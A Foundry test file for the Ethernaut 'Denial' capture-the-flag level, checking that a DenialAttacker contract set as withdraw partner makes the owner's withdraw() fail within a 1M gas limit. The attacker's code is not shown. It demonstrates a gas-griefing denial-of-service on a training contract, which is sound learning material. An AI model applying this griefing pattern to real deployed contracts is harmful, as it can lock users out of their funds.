// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Denial, DenialAttacker} from "./Denial.sol";

// https://ethernaut.openzeppelin.com/level/20

contract DenialTest is Test {
    Denial public denial;
    address owner = address(0x1);

    function setUp() public {
        denial = new Denial();
        payable(address(denial)).transfer(10 ether);
    }

    function testGriefAttack() public {
        DenialAttacker attacker = new DenialAttacker();
        denial.setWithdrawPartner(address(attacker));

        vm.prank(denial.owner());
        // rules say 1m gas max
        (bool success, ) = address(denial).call{gas: 1_000_000}(
            abi.encodeWithSignature("withdraw()")
        );
        assertFalse(success);
    }
}